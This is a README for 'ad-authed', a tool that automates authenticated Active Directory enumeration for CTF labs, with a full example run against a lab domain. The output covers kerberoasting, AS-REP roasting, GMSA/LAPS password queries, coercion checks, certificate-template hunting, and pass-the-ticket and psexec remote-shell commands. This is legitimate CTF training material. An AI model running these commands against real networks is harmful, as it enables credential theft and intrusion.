# ad-authed
This repository hosts ad-authed to automate various authenticated enumeration tasks for use in CTF challenges.

# Installation

```bash
python3 setup.py
```

# Usage

```bash
ad-authed -t $IP -u $USER -p $PASS
ad-authed -t $IP -u $USER -H $HASH
export KRB5CCACHE='/path/to/ccache/file'
ad-authed -t $IP -k
ad-authed -t $IP -u $USER -p $PASS -d $DOMAIN
```
# Example

```bash
┌─[✗]─[kali@parrot]─[~/hybrid]
└──╼ $export IP='10.10.146.165'
┌─[✗]─[kali@parrot]─[~/hybrid]
└──╼ $export DOMAIN='hybrid.vl'
┌─[✗]─[kali@parrot]─[~/hybrid]
└──╼ $export USER='peter.turner'
┌─[✗]─[kali@parrot]─[~/hybrid]
└──╼ $export PASS='<redacted>'
┌─[kali@parrot]─[~/hybrid]
└──╼ $ad-authed -t $IP -u $USER -p $PASS -d $DOMAIN
Getting TGT: python3 /usr/share/doc/python3-impacket/examples/getTGT.py hybrid.vl/peter.turner:<redacted> > /home/kali/hybrid/peter.turner.ccache
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Saving ticket in peter.turner.ccache
Converting TGT to KIRBI: python3 /usr/share/doc/python3-impacket/examples/ticketConverter.py ad-authed-peter.turner-hybrid-vl/peter.turner.ccache ad-authed-peter.turner-hybrid-vl/peter.turner.kirbi
Impacket v0.11.0 - Copyright 2023 Fortra

[*] converting ccache to kirbi...
[+] done
Running command with password for target 10.10.146.165, username peter.turner, domain hybrid.vl, dc DC01.hybrid.vl
Running command: /home/kali/.local/bin/windapsearch -u peter.turner -d hybrid.vl --dc DC01.hybrid.vl -m admin-objects -p <redacted> > ad-authed-peter.turner-hybrid-vl/windapsearch/admin-objects.txt
Running command: /home/kali/.local/bin/windapsearch -u peter.turner -d hybrid.vl --dc DC01.hybrid.vl -m computers -p <redacted> > ad-authed-peter.turner-hybrid-vl/windapsearch/computers.txt
Running command: /home/kali/.local/bin/windapsearch -u peter.turner -d hybrid.vl --dc DC01.hybrid.vl -m domain-admins -p <redacted> > ad-authed-peter.turner-hybrid-vl/windapsearch/domain-admins.txt
Running command: /home/kali/.local/bin/windapsearch -u peter.turner -d hybrid.vl --dc DC01.hybrid.vl -m gpos -p <redacted> > ad-authed-peter.turner-hybrid-vl/windapsearch/gpos.txt
Running command: /home/kali/.local/bin/windapsearch -u peter.turner -d hybrid.vl --dc DC01.hybrid.vl -m groups -p <redacted> > ad-authed-peter.turner-hybrid-vl/windapsearch/groups.txt
Running command: /home/kali/.local/bin/windapsearch -u peter.turner -d hybrid.vl --dc DC01.hybrid.vl -m privileged-users -p <redacted> > ad-authed-peter.turner-hybrid-vl/windapsearch/privileged-users.txt
Running command: /home/kali/.local/bin/windapsearch -u peter.turner -d hybrid.vl --dc DC01.hybrid.vl -m unconstrained -p <redacted> > ad-authed-peter.turner-hybrid-vl/windapsearch/unconstrained.txt
Running command: python3 /home/kali/.local/bin/enum4linux-ng.py -A 10.10.146.165 -u peter.turner -p <redacted> and writing output to ad-authed-peter.turner-hybrid-vl/enum4linux-ng-output.txt
Running command: /home/kali/.local/bin/ldapdomaindump 10.10.146.165 -u hybrid.vl\peter.turner -p <redacted>
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
Running command: nxc ldap 10.10.146.165 -u peter.turner -p <redacted> --bloodhound -c all --dns-server 10.10.146.165 --dns-timeout 10 --dns-tcp
LDAP        10.10.146.165   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hybrid.vl)
LDAP        10.10.146.165   389    DC01             [+] hybrid.vl\peter.turner:<redacted>
LDAP        10.10.146.165   389    DC01             Resolved collection methods: dcom, group, acl, container, objectprops, trusts, psremote, rdp, localadmin, session
LDAP        10.10.146.165   389    DC01             Done in 00M 25S
LDAP        10.10.146.165   389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.10.146.165_2025-01-18_225516_bloodhound.zip
Running command: nxc ldap 10.10.146.165 -u hybrid.vl\peter.turner -p <redacted> --kerberoasting kerberoast-output.txt
LDAP        10.10.146.165   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hybrid.vl)
LDAP        10.10.146.165   389    DC01             [+] hybrid.vl\peter.turner:<redacted>
LDAP        10.10.146.165   389    DC01             Bypassing disabled account krbtgt
LDAP        10.10.146.165   389    DC01             No entries found!
LDAP        10.10.146.165   389    DC01             [-] Error with the LDAP account used
Running command: netexec ldap 10.10.146.165 -u hybrid.vl\peter.turner -p <redacted> --kdcHost DC01.hybrid.vl --asreproast asreproasting-output.txt
LDAP        10.10.146.165   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hybrid.vl)
LDAP        10.10.146.165   389    DC01             [+] hybrid.vl\peter.turner:<redacted>
LDAP        10.10.146.165   389    DC01             [*] Total of records returned 3
LDAP        10.10.146.165   389    DC01             No entries found!
Running command: nxc ldap 10.10.146.165 -u hybrid.vl\peter.turner -p <redacted> --trusted-for-delegation
LDAP        10.10.146.165   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hybrid.vl)
LDAP        10.10.146.165   389    DC01             [+] hybrid.vl\peter.turner:<redacted>
LDAP        10.10.146.165   389    DC01             DC01$
Running command: nxc ldap 10.10.146.165 -u hybrid.vl\peter.turner -p <redacted> --gmsa
LDAP        10.10.146.165   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hybrid.vl)
LDAPS       10.10.146.165   636    DC01             [+] hybrid.vl\peter.turner:<redacted>
LDAPS       10.10.146.165   636    DC01             [*] Getting GMSA Passwords
Running command: nxc ldap 10.10.146.165 -u hybrid.vl\peter.turner -p <redacted> -M enum_trusts
LDAP        10.10.146.165   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hybrid.vl)
LDAP        10.10.146.165   389    DC01             [+] hybrid.vl\peter.turner:<redacted>
ENUM_TRUSTS 10.10.146.165   389    DC01             [*] No trust relationships found
Running command: nxc smb 10.10.146.165 -u peter.turner -p <redacted> -d hybrid.vl --groups
SMB         10.10.146.165   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False)
SMB         10.10.146.165   445    DC01             [+] hybrid.vl\peter.turner:<redacted>
SMB         10.10.146.165   445    DC01             [+] Enumerated domain group(s)
SMB         10.10.146.165   445    DC01             HybridUsers                              membercount: 10
SMB         10.10.146.165   445    DC01             DnsUpdateProxy                           membercount: 0
SMB         10.10.146.165   445    DC01             DnsAdmins                                membercount: 0
SMB         10.10.146.165   445    DC01             Enterprise Key Admins                    membercount: 0
SMB         10.10.146.165   445    DC01             Key Admins                               membercount: 0
SMB         10.10.146.165   445    DC01             Protected Users                          membercount: 0
SMB         10.10.146.165   445    DC01             Cloneable Domain Controllers             membercount: 0
SMB         10.10.146.165   445    DC01             Enterprise Read-only Domain Controllers  membercount: 0
SMB         10.10.146.165   445    DC01             Read-only Domain Controllers             membercount: 0
SMB         10.10.146.165   445    DC01             Denied RODC Password Replication Group   membercount: 8
SMB         10.10.146.165   445    DC01             Allowed RODC Password Replication Group  membercount: 0
SMB         10.10.146.165   445    DC01             Terminal Server License Servers          membercount: 0
SMB         10.10.146.165   445    DC01             Windows Authorization Access Group       membercount: 1
SMB         10.10.146.165   445    DC01             Incoming Forest Trust Builders           membercount: 0
SMB         10.10.146.165   445    DC01             Pre-Windows 2000 Compatible Access       membercount: 2
SMB         10.10.146.165   445    DC01             Account Operators                        membercount: 0
SMB         10.10.146.165   445    DC01             Server Operators                         membercount: 0
SMB         10.10.146.165   445    DC01             RAS and IAS Servers                      membercount: 0
SMB         10.10.146.165   445    DC01             Group Policy Creator Owners              membercount: 1
SMB         10.10.146.165   445    DC01             Domain Guests                            membercount: 0
SMB         10.10.146.165   445    DC01             Domain Users                             membercount: 0
SMB         10.10.146.165   445    DC01             Domain Admins                            membercount: 2
SMB         10.10.146.165   445    DC01             Cert Publishers                          membercount: 1
SMB         10.10.146.165   445    DC01             Enterprise Admins                        membercount: 1
SMB         10.10.146.165   445    DC01             Schema Admins                            membercount: 1
SMB         10.10.146.165   445    DC01             Domain Controllers                       membercount: 0
SMB         10.10.146.165   445    DC01             Domain Computers                         membercount: 0
SMB         10.10.146.165   445    DC01             Storage Replica Administrators           membercount: 0
SMB         10.10.146.165   445    DC01             Remote Management Users                  membercount: 0
SMB         10.10.146.165   445    DC01             Access Control Assistance Operators      membercount: 0
SMB         10.10.146.165   445    DC01             Hyper-V Administrators                   membercount: 0
SMB         10.10.146.165   445    DC01             RDS Management Servers                   membercount: 0
SMB         10.10.146.165   445    DC01             RDS Endpoint Servers                     membercount: 0
SMB         10.10.146.165   445    DC01             RDS Remote Access Servers                membercount: 0
SMB         10.10.146.165   445    DC01             Certificate Service DCOM Access          membercount: 1
SMB         10.10.146.165   445    DC01             Event Log Readers                        membercount: 0
SMB         10.10.146.165   445    DC01             Cryptographic Operators                  membercount: 0
SMB         10.10.146.165   445    DC01             IIS_IUSRS                                membercount: 1
SMB         10.10.146.165   445    DC01             Distributed COM Users                    membercount: 0
SMB         10.10.146.165   445    DC01             Performance Log Users                    membercount: 0
SMB         10.10.146.165   445    DC01             Performance Monitor Users                membercount: 0
SMB         10.10.146.165   445    DC01             Network Configuration Operators          membercount: 0
SMB         10.10.146.165   445    DC01             Remote Desktop Users                     membercount: 0
SMB         10.10.146.165   445    DC01             Replicator                               membercount: 0
SMB         10.10.146.165   445    DC01             Backup Operators                         membercount: 0
SMB         10.10.146.165   445    DC01             Print Operators                          membercount: 0
SMB         10.10.146.165   445    DC01             Guests                                   membercount: 2
SMB         10.10.146.165   445    DC01             Users                                    membercount: 3
SMB         10.10.146.165   445    DC01             Administrators                           membercount: 3
Running command: nxc smb 10.10.146.165 -u peter.turner -p <redacted> -d hybrid.vl --local-groups
SMB         10.10.146.165   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False)
SMB         10.10.146.165   445    DC01             [+] hybrid.vl\peter.turner:<redacted>
SMB         10.10.146.165   445    DC01             [+] Enumerated local groups
SMB         10.10.146.165   445    DC01             Cert Publishers                          membercount: 1
SMB         10.10.146.165   445    DC01             RAS and IAS Servers                      membercount: 0
SMB         10.10.146.165   445    DC01             Allowed RODC Password Replication Group  membercount: 0
SMB         10.10.146.165   445    DC01             Denied RODC Password Replication Group   membercount: 8
SMB         10.10.146.165   445    DC01             DnsAdmins                                membercount: 0
SMB         10.10.146.165   445    DC01             Server Operators                         membercount: 0
SMB         10.10.146.165   445    DC01             Account Operators                        membercount: 0
SMB         10.10.146.165   445    DC01             Pre-Windows 2000 Compatible Access       membercount: 2
SMB         10.10.146.165   445    DC01             Incoming Forest Trust Builders           membercount: 0
SMB         10.10.146.165   445    DC01             Windows Authorization Access Group       membercount: 1
SMB         10.10.146.165   445    DC01             Terminal Server License Servers          membercount: 0
SMB         10.10.146.165   445    DC01             Administrators                           membercount: 3
SMB         10.10.146.165   445    DC01             Users                                    membercount: 3
SMB         10.10.146.165   445    DC01             Guests                                   membercount: 2
SMB         10.10.146.165   445    DC01             Print Operators                          membercount: 0
SMB         10.10.146.165   445    DC01             Backup Operators                         membercount: 0
SMB         10.10.146.165   445    DC01             Replicator                               membercount: 0
SMB         10.10.146.165   445    DC01             Remote Desktop Users                     membercount: 0
SMB         10.10.146.165   445    DC01             Network Configuration Operators          membercount: 0
SMB         10.10.146.165   445    DC01             Performance Monitor Users                membercount: 0
SMB         10.10.146.165   445    DC01             Performance Log Users                    membercount: 0
SMB         10.10.146.165   445    DC01             Distributed COM Users                    membercount: 0
SMB         10.10.146.165   445    DC01             IIS_IUSRS                                membercount: 1
SMB         10.10.146.165   445    DC01             Cryptographic Operators                  membercount: 0
SMB         10.10.146.165   445    DC01             Event Log Readers                        membercount: 0
SMB         10.10.146.165   445    DC01             Certificate Service DCOM Access          membercount: 1
SMB         10.10.146.165   445    DC01             RDS Remote Access Servers                membercount: 0
SMB         10.10.146.165   445    DC01             RDS Endpoint Servers                     membercount: 0
SMB         10.10.146.165   445    DC01             RDS Management Servers                   membercount: 0
SMB         10.10.146.165   445    DC01             Hyper-V Administrators                   membercount: 0
SMB         10.10.146.165   445    DC01             Access Control Assistance Operators      membercount: 0
SMB         10.10.146.165   445    DC01             Remote Management Users                  membercount: 0
SMB         10.10.146.165   445    DC01             Storage Replica Administrators           membercount: 0
Running command: nxc smb 10.10.146.165 -u peter.turner -p <redacted> -d hybrid.vl --loggedon-users
SMB         10.10.146.165   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False)
SMB         10.10.146.165   445    DC01             [+] hybrid.vl\peter.turner:<redacted>
SMB         10.10.146.165   445    DC01             [+] Enumerated logged_on users
Running command: nxc smb 10.10.146.165 -u peter.turner -p <redacted> -d hybrid.vl --rid-brute
SMB         10.10.146.165   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False)
SMB         10.10.146.165   445    DC01             [+] hybrid.vl\peter.turner:<redacted>
SMB         10.10.146.165   445    DC01             498: HYBRID\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.146.165   445    DC01             500: HYBRID\Administrator (SidTypeUser)
SMB         10.10.146.165   445    DC01             501: HYBRID\Guest (SidTypeUser)
SMB         10.10.146.165   445    DC01             502: HYBRID\krbtgt (SidTypeUser)
SMB         10.10.146.165   445    DC01             512: HYBRID\Domain Admins (SidTypeGroup)
SMB         10.10.146.165   445    DC01             513: HYBRID\Domain Users (SidTypeGroup)
SMB         10.10.146.165   445    DC01             514: HYBRID\Domain Guests (SidTypeGroup)
SMB         10.10.146.165   445    DC01             515: HYBRID\Domain Computers (SidTypeGroup)
SMB         10.10.146.165   445    DC01             516: HYBRID\Domain Controllers (SidTypeGroup)
SMB         10.10.146.165   445    DC01             517: HYBRID\Cert Publishers (SidTypeAlias)
SMB         10.10.146.165   445    DC01             518: HYBRID\Schema Admins (SidTypeGroup)
SMB         10.10.146.165   445    DC01             519: HYBRID\Enterprise Admins (SidTypeGroup)
SMB         10.10.146.165   445    DC01             520: HYBRID\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.146.165   445    DC01             521: HYBRID\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.146.165   445    DC01             522: HYBRID\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.146.165   445    DC01             525: HYBRID\Protected Users (SidTypeGroup)
SMB         10.10.146.165   445    DC01             526: HYBRID\Key Admins (SidTypeGroup)
SMB         10.10.146.165   445    DC01             527: HYBRID\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.146.165   445    DC01             553: HYBRID\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.146.165   445    DC01             571: HYBRID\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.146.165   445    DC01             572: HYBRID\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.146.165   445    DC01             1000: HYBRID\DC01$ (SidTypeUser)
SMB         10.10.146.165   445    DC01             1101: HYBRID\DnsAdmins (SidTypeAlias)
SMB         10.10.146.165   445    DC01             1102: HYBRID\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.146.165   445    DC01             1103: HYBRID\MAIL01$ (SidTypeUser)
SMB         10.10.146.165   445    DC01             1104: HYBRID\HybridUsers (SidTypeGroup)
SMB         10.10.146.165   445    DC01             1105: HYBRID\Edward.Miller (SidTypeUser)
SMB         10.10.146.165   445    DC01             1106: HYBRID\Pamela.Smith (SidTypeUser)
SMB         10.10.146.165   445    DC01             1107: HYBRID\Josh.Mitchell (SidTypeUser)
SMB         10.10.146.165   445    DC01             1108: HYBRID\Peter.Turner (SidTypeUser)
SMB         10.10.146.165   445    DC01             1109: HYBRID\Olivia.Smith (SidTypeUser)
SMB         10.10.146.165   445    DC01             1110: HYBRID\Ricky.Myers (SidTypeUser)
SMB         10.10.146.165   445    DC01             1111: HYBRID\Elliot.Watkins (SidTypeUser)
SMB         10.10.146.165   445    DC01             1112: HYBRID\Emily.White (SidTypeUser)
SMB         10.10.146.165   445    DC01             1113: HYBRID\Kathleen.Walker (SidTypeUser)
SMB         10.10.146.165   445    DC01             1114: HYBRID\Margaret.Shepherd (SidTypeUser)
Running command: nxc smb 10.10.146.165 -u peter.turner -p <redacted> -d hybrid.vl --sessions
SMB         10.10.146.165   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False)
SMB         10.10.146.165   445    DC01             [+] hybrid.vl\peter.turner:<redacted>
SMB         10.10.146.165   445    DC01             [*] Enumerated sessions
Running command: nxc smb 10.10.146.165 -u peter.turner -p <redacted> -d hybrid.vl --users
SMB         10.10.146.165   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False)
SMB         10.10.146.165   445    DC01             [+] hybrid.vl\peter.turner:<redacted>
SMB         10.10.146.165   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.10.146.165   445    DC01             Administrator                 2023-06-17 14:53:20 0       Built-in account for administering the computer/domain
SMB         10.10.146.165   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.10.146.165   445    DC01             krbtgt                        2023-06-17 14:04:47 0       Key Distribution Center Service Account
SMB         10.10.146.165   445    DC01             Edward.Miller                 2023-06-17 14:46:22 0
SMB         10.10.146.165   445    DC01             Pamela.Smith                  2023-06-17 14:46:22 0
SMB         10.10.146.165   445    DC01             Josh.Mitchell                 2023-06-17 14:46:22 0
SMB         10.10.146.165   445    DC01             Peter.Turner                  2023-06-17 14:46:22 0
SMB         10.10.146.165   445    DC01             Olivia.Smith                  2023-06-17 14:46:22 0
SMB         10.10.146.165   445    DC01             Ricky.Myers                   2023-06-17 14:46:23 0
SMB         10.10.146.165   445    DC01             Elliot.Watkins                2023-06-17 14:46:23 0
SMB         10.10.146.165   445    DC01             Emily.White                   2023-06-17 14:46:23 0
SMB         10.10.146.165   445    DC01             Kathleen.Walker               2023-06-17 14:46:23 0
SMB         10.10.146.165   445    DC01             Margaret.Shepherd             2023-06-17 14:46:23 0
SMB         10.10.146.165   445    DC01             [*] Enumerated 13 local users: HYBRID
Running command: nxc smb 10.10.146.165 -u peter.turner -p <redacted> -d hybrid.vl --shares
SMB         10.10.146.165   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False)
SMB         10.10.146.165   445    DC01             [+] hybrid.vl\peter.turner:<redacted>
SMB         10.10.146.165   445    DC01             [*] Enumerated shares
SMB         10.10.146.165   445    DC01             Share           Permissions     Remark
SMB         10.10.146.165   445    DC01             -----           -----------     ------
SMB         10.10.146.165   445    DC01             ADMIN$                          Remote Admin
SMB         10.10.146.165   445    DC01             C$                              Default share
SMB         10.10.146.165   445    DC01             IPC$            READ            Remote IPC
SMB         10.10.146.165   445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.146.165   445    DC01             SYSVOL          READ            Logon server share
Running command: nxc smb 10.10.146.165 -u peter.turner -p <redacted> -d hybrid.vl --pass-pol
SMB         10.10.146.165   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False)
SMB         10.10.146.165   445    DC01             [+] hybrid.vl\peter.turner:<redacted>
SMB         10.10.146.165   445    DC01             [+] Dumping password info for domain: HYBRID
SMB         10.10.146.165   445    DC01             Minimum password length: 7
SMB         10.10.146.165   445    DC01             Password history length: 24
SMB         10.10.146.165   445    DC01             Maximum password age: 41 days 23 hours 53 minutes
SMB         10.10.146.165   445    DC01
SMB         10.10.146.165   445    DC01             Password Complexity Flags: 000001
SMB         10.10.146.165   445    DC01                 Domain Refuse Password Change: 0
SMB         10.10.146.165   445    DC01                 Domain Password Store Cleartext: 0
SMB         10.10.146.165   445    DC01                 Domain Password Lockout Admins: 0
SMB         10.10.146.165   445    DC01                 Domain Password No Clear Change: 0
SMB         10.10.146.165   445    DC01                 Domain Password No Anon Change: 0
SMB         10.10.146.165   445    DC01                 Domain Password Complex: 1
SMB         10.10.146.165   445    DC01
SMB         10.10.146.165   445    DC01             Minimum password age: 1 day 4 minutes
SMB         10.10.146.165   445    DC01             Reset Account Lockout Counter: 10 minutes
SMB         10.10.146.165   445    DC01             Locked Account Duration: 10 minutes
SMB         10.10.146.165   445    DC01             Account Lockout Threshold: None
SMB         10.10.146.165   445    DC01             Forced Log off Time: Not Set
Running command: nxc smb 10.10.146.165 -u peter.turner -p <redacted> -d hybrid.vl -Mwebdav
SMB         10.10.146.165   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False)
SMB         10.10.146.165   445    DC01             [+] hybrid.vl\peter.turner:<redacted>
Running command: nxc smb 10.10.146.165 -u peter.turner -p <redacted> -d hybrid.vl -Mcoerce_plus
SMB         10.10.146.165   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False)
SMB         10.10.146.165   445    DC01             [+] hybrid.vl\peter.turner:<redacted>
COERCE_PLUS 10.10.146.165   445    DC01             VULNERABLE, DFSCoerce
COERCE_PLUS 10.10.146.165   445    DC01             VULNERABLE, PetitPotam
COERCE_PLUS 10.10.146.165   445    DC01             VULNERABLE, PrinterBug
COERCE_PLUS 10.10.146.165   445    DC01             VULNERABLE, PrinterBug
COERCE_PLUS 10.10.146.165   445    DC01             VULNERABLE, MSEven
Running command: nxc smb 10.10.146.165 -u peter.turner -p <redacted> -d hybrid.vl -Mspooler
SMB         10.10.146.165   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False)
SMB         10.10.146.165   445    DC01             [+] hybrid.vl\peter.turner:<redacted>
SPOOLER     10.10.146.165   445    DC01             Spooler service enabled
Running command: nxc smb 10.10.146.165 -u peter.turner -p <redacted> -d hybrid.vl -Menum_av
SMB         10.10.146.165   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False)
SMB         10.10.146.165   445    DC01             [+] hybrid.vl\peter.turner:<redacted>
ENUM_AV     10.10.146.165   445    DC01             Found Windows Defender INSTALLED
Running command: nxc ldap 10.10.146.165 -u hybrid.vl\peter.turner -p <redacted> -M maq
LDAP        10.10.146.165   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hybrid.vl)
LDAP        10.10.146.165   389    DC01             [+] hybrid.vl\peter.turner:<redacted>
MAQ         10.10.146.165   389    DC01             [*] Getting the MachineAccountQuota
MAQ         10.10.146.165   389    DC01             MachineAccountQuota: 0
Running command: nxc ldap 10.10.146.165 -u hybrid.vl\peter.turner -p <redacted> -M laps
LDAP        10.10.146.165   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:hybrid.vl)
LDAP        10.10.146.165   389    DC01             [+] hybrid.vl\peter.turner:<redacted>
LAPS        10.10.146.165   389    DC01             [*] Getting LAPS Passwords
LAPS        10.10.146.165   389    DC01             [-] No result found with attribute ms-MCS-AdmPwd or msLAPS-Password !
Running command: nxc smb 10.10.146.165 -u peter.turner -p <redacted> -d hybrid.vl -M spider_plus -o DOWNLOAD_FLAG=True
SMB         10.10.146.165   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hybrid.vl) (signing:True) (SMBv1:False)
SMB         10.10.146.165   445    DC01             [+] hybrid.vl\peter.turner:<redacted>
SPIDER_PLUS 10.10.146.165   445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.10.146.165   445    DC01             [*]  DOWNLOAD_FLAG: True
SPIDER_PLUS 10.10.146.165   445    DC01             [*]     STATS_FLAG: True
SPIDER_PLUS 10.10.146.165   445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.10.146.165   445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.10.146.165   445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.10.146.165   445    DC01             [*]  OUTPUT_FOLDER: /tmp/nxc_hosted/nxc_spider_plus
SMB         10.10.146.165   445    DC01             [*] Enumerated shares
SMB         10.10.146.165   445    DC01             Share           Permissions     Remark
SMB         10.10.146.165   445    DC01             -----           -----------     ------
SMB         10.10.146.165   445    DC01             ADMIN$                          Remote Admin
SMB         10.10.146.165   445    DC01             C$                              Default share
SMB         10.10.146.165   445    DC01             IPC$            READ            Remote IPC
SMB         10.10.146.165   445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.146.165   445    DC01             SYSVOL          READ            Logon server share
SPIDER_PLUS 10.10.146.165   445    DC01             [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/10.10.146.165.json".
SPIDER_PLUS 10.10.146.165   445    DC01             [*] SMB Shares:           5 (ADMIN$, C$, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.10.146.165   445    DC01             [*] SMB Readable Shares:  3 (IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.10.146.165   445    DC01             [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.10.146.165   445    DC01             [*] Total folders found:  16
SPIDER_PLUS 10.10.146.165   445    DC01             [*] Total files found:    5
SPIDER_PLUS 10.10.146.165   445    DC01             [*] File size average:    1.5 KB
SPIDER_PLUS 10.10.146.165   445    DC01             [*] File size min:        22 B
SPIDER_PLUS 10.10.146.165   445    DC01             [*] File size max:        3.68 KB
SPIDER_PLUS 10.10.146.165   445    DC01             [*] File unique exts:     3 (pol, inf, ini)
SPIDER_PLUS 10.10.146.165   445    DC01             [*] Downloads successful: 5
SPIDER_PLUS 10.10.146.165   445    DC01             [+] All files processed successfully.
certipy command: /home/kali/.local/bin/certipy find -u peter.turner -p <redacted> -dc-ip 10.10.146.165 -vulnerable -old-bloodhound
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'hybrid-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'hybrid-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'hybrid-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'hybrid-DC01-CA'
[*] Saved BloodHound data to '20250118225924_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @BloodHoundAD
Rubeus.exe ptt /ticket:peter.turner.kirbi
mimikatz.exe "privilege::debug" "kerberos::ptt peter.turner.kirbi"
psexec.exe \\10.10.146.165 -accepteula cmd.exe
export KRB5CCNAME=/home/kali/hybrid/ad-authed-peter.turner-hybrid-vl/peter.turner.ccache
psexec.py -k -no-pass -target-ip 10.10.146.165 -dc-ip DC01.hybrid.vl DC01
```

```bash
┌─[kali@parrot]─[~/hybrid/ad-authed-peter.turner-hybrid-vl]
└──╼ $ls -lah
total 12K
drwxr-xr-x 1 kali kali  244 Jan 18 23:03 .
drwxr-xr-x 1 kali kali   64 Jan 18 23:03 ..
drwxr-xr-x 1 kali kali  154 Jan 18 22:59 bloodhound
drwxr-xr-x 1 kali kali    0 Jan 18 22:59 certipy
-rw-r--r-- 1 kali kali 1.4K Jan 18 23:03 enum4linux-ng-output.txt
drwxr-xr-x 1 kali kali  658 Jan 18 22:55 ldapdomaindump-output
-rw-r--r-- 1 kali kali 1.4K Jan 18 23:03 peter.turner.ccache
-rw-r--r-- 1 kali kali 1.5K Jan 18 23:03 peter.turner.kirbi
drwxr-xr-x 1 kali kali   62 Jan 18 22:59 spider_plus
drwxr-xr-x 1 kali kali  204 Jan 18 22:54 windapsearch
```
